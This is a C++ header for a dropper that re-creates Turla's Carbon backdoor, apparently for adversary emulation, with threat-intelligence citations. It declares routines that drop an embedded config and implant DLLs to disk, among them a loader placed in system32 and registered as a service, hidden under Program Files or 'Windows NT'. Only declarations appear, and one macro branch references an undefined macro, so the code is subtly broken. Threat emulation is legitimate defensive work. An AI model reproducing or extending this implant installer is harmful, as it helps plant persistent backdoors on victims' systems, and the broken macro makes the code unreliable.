/* 
 * Handle file operations for the dropper
 *
 * CTI references:
 * [1] https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 * [2] https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 * [3] https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */

#ifndef FILE_HANDLER_H_
#define FILE_HANDLER_H_

#include <windows.h>
#include <winbase.h>
#include <sddl.h>
#include <filesystem>
#include <string>

#define FAIL_OPEN_FILE_WRITE 0x100
#define FAIL_TARGET_BASE_DIR_DNE 0x101
#define FAIL_ENV_DNE_PROG_FILE 0x102
#define FAIL_DROP_CONFIG_BASE_DIR_NOT_INIT 0x103
#define FAIL_DROP_CONFIG_FILE_WRITE 0x104
#define FAIL_DROP_LOADER_FILE_WRITE 0x105
#define FAIL_DROP_LOADER_ENV_DNE_SYS_ROOT 0x106
#define FAIL_DROP_ORCH_FILE_WRITE 0x107
#define FAIL_DROP_ORCH_BASE_DIR_NOT_INIT 0x108
#define FAIL_DROP_COMMS_FILE_WRITE 0x109
#define FAIL_DROP_COMMS_BASE_DIR_NOT_INIT 0x10A

#define QUOTE_DIRECTORY(X) #X
#define EXPAND_AND_QUOTE_DIR(X) QUOTE_DIRECTORY(X)
#ifndef HOME_DIR_NAME
#define HOME_DIRECTORY_NAME "Windows NT"
#else
#define HOME_DIRECTORY_NAME EXPAND_AND_QUOTE_HOME_DIR(HOME_DIR_NAME)
#endif

// Handle files for the implant.
namespace file_handler {

// The Carbon DLL dropper will install the Carbon components and config file [1]
extern const char* kConfigFileName;
extern const char* kLoaderDllName; // Will be registered as a service [3]
extern const char* kOrchestratorDllName;
extern const char* kCommsDllName;
extern std::string base_working_directory;

// Based on Carbon 3.77 example config file [1]
extern const unsigned char kConfigFileData[];
extern const std::streamsize kConfigFileDataLen;

// DLL component data
extern const unsigned char kLoaderDllData[];
extern const unsigned char kOrchestratorDllData[];
extern const unsigned char kCommsDllData[];
extern const std::streamsize kLoaderDllDataLen;
extern const std::streamsize kOrchestratorDllDataLen;
extern const std::streamsize kCommsDllDataLen;

// Interface for file handler API calls to be wrapped. Will be used in source code and test files.
class FileHandlerCallWrapperInterface {
public:
	FileHandlerCallWrapperInterface(){}
	virtual ~FileHandlerCallWrapperInterface(){}
	virtual int WriteDataToFile(std::string filepath, const unsigned char* data, std::streamsize n) = 0;
	virtual std::string GetEnvironmentVariableWrapper(const char* env_var) = 0;
	virtual bool DirectoryExists(std::filesystem::path dir) = 0;

	// Wrapper for ConvertStringSecurityDescriptorToSecurityDescriptor (sddl.h)
    virtual BOOL ConvertStringSecurityDescriptorToSecurityDescriptorWrapper(
        LPCWSTR              StringSecurityDescriptor,
        DWORD                StringSDRevision,
        PSECURITY_DESCRIPTOR *SecurityDescriptor,
        PULONG               SecurityDescriptorSize
    ) = 0;

	// Wrapper for GetLastError (errhandlingapi.h)
    virtual DWORD GetLastErrorWrapper() = 0;

	// Wrapper for LocalFree (winbase.h)
    virtual HLOCAL LocalFreeWrapper(HLOCAL hMem) = 0;

	// Wrapper for CreateDirectory (winbase.h)
	virtual BOOL CreateDirectoryWrapper(
		LPCWSTR               lpPathName,
		LPSECURITY_ATTRIBUTES lpSecurityAttributes
	) = 0;
};

class FileHandlerCallWrapper : public FileHandlerCallWrapperInterface {
public:
	// Helper function to write arbitrary data to the specified output file.
	int WriteDataToFile(std::string filepath, const unsigned char* data, std::streamsize n);
	
	// Wrapper for getting environment variable values.
	std::string GetEnvironmentVariableWrapper(const char* env_var);

	// Wrapper to check if directory exists
	bool DirectoryExists(std::filesystem::path dir);

	BOOL ConvertStringSecurityDescriptorToSecurityDescriptorWrapper(
        LPCWSTR              StringSecurityDescriptor,
        DWORD                StringSDRevision,
        PSECURITY_DESCRIPTOR *SecurityDescriptor,
        PULONG               SecurityDescriptorSize
    );

	DWORD GetLastErrorWrapper();

	HLOCAL LocalFreeWrapper(HLOCAL hMem);

	BOOL CreateDirectoryWrapper(
		LPCWSTR               lpPathName,
		LPSECURITY_ATTRIBUTES lpSecurityAttributes
	);
};

// Carbon typically selects a random directory from %ProgramFiles% (excluding WindowsApps) to serve
// as the base working directory [1][3].
int SetBaseWorkingDirectory(FileHandlerCallWrapperInterface* fh_call_wrapper);

// Drop the implant components to disk. Returns ERROR_SUCCESS on success, otherwise EXIT_FAILURE
int DropComponents(FileHandlerCallWrapperInterface* fh_call_wrapper);

// Write the configuration file to disk in the base working directory [1].
int DropConfigFile(FileHandlerCallWrapperInterface* fh_call_wrapper);

// Write the loader DLL to disk in %SystemRoot%\system32\ [3].
int DropLoaderDll(FileHandlerCallWrapperInterface* fh_call_wrapper);

// Get the path to the loader DLL written to disk.
std::string GetLoaderDllPath();

// Write the orchestrator DLL to disk in the base working directory.
int DropOrchestratorDll(FileHandlerCallWrapperInterface* fh_call_wrapper);

// Write the communications library DLL to disk in the base working directory [1].
int DropCommsDll(FileHandlerCallWrapperInterface* fh_call_wrapper);

} // namespace file_handler
	
#endif
	
